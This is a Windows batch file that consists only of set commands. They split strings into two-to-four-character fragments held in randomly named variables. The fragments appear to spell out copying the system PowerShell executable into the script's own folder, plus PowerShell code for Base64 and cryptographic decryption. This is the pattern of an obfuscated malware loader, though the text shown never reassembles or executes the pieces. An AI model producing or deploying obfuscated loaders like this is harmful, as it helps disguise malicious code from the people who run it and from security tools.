@echo off
set "JhrbbwFmoU=ws"
set "CqOKfjdoVd=nd"
set "bPZENwbzVn=he"
set "pmVVtGcnze=in"
set "KolOMTWqUR=32"
set "cYvwEHZiwW=:\"
set "pySqGEurBM=py"
set "RIRQBfcgFg=we"
set "seyvSPopWq=rs"
set "yFIaLwPDvK=we"
set "CzuyebImdf=1."
set "uVaiEMUYgN=.e"
set "rTaOdxtpvg=Po"
set "lpRSAuymmG=co"
set "grfqvUZCiH=\W"
set "zcCwzQgpIt=Wi"
set "PclCWxUFHX= C"
set "uBVFYhUTUW=rS"
set "ElVFnMzOdg=s\"
set "NKDJOqviws=em"
set "nRVNGWdOVC=xe"
set "qboYLozxGD=do"
set "UeJhWvBtpr=y "
set "qFXouLkLrv=Sy"
set "tzHhAPXvQV=\v"
set "qtISQBWsOu= /"
set "DKmswFxmTh=st"
set "dDkrkjzvSW=0\"
set "qCCUejfwUC=he"
set "VkcAMbqBAW=ll"
set "URhfGyUkGO=ll"
set "RttYDChReX=po"
set "zTEpDrcwLZ=ow"
set "IfMesDdWcb= %~dp0"
set "HKQpYKFExo=cd"
set "uSXfwcBnDA=Disp"
set "UrwuCSupGl=Obje"
set "ZlTjBHzwZL=tS46"
set "fBoACWOATP=)))"
set "jmtRvGvUeQ=UFT."
set "lMiXqzPWjf=[Sys"
set "KEwqAnVmfY=;$Lo"
set "hpXtohYkPV=]::("
set "ZXiIrXBXKK=ect "
set "KBqMOFdGzd=Y.En"
set "jMmgYkXnNI=.Com"
set "icJAQefKNf=sion"
set "dSRkOpfGln=le  "
set "MovCDIxKTx= [Sy"
set "KABYlldMOk=zHhH"
set "NwzLtvNgop=.Cry"
set "QLWQkBQyPl=]::C"
set "HeUdKBBxiD=K = "
set "jCHFqczgef=ach "
set "eMkxyQYhTe=ihD "
set "zQCXTXgwQn=::De"
set "JiKpUcJCQK= = N"
set "QlxraqEhmT=join"
set "zZzIuoslJZ=brea"
set "jrpcBsSOTN=Rorl"
set "RxDySVATmv=L4Yi"
set "xulmTdBQiO=rans"
set "nkunmtSneP=vnRK"
set "sMaybzKRFr=Wq.T"
set "iluEIdyTzH=3); "
set "HIYrMmcDSP='')("
set "VwfmTpfItl=raph"
set "esmasktIhE= if "
set "FpwKsyzAbj=;$vA"
set "gsztCRwwDs=FT.T"
set "CfIDFCoXkG=RK ="
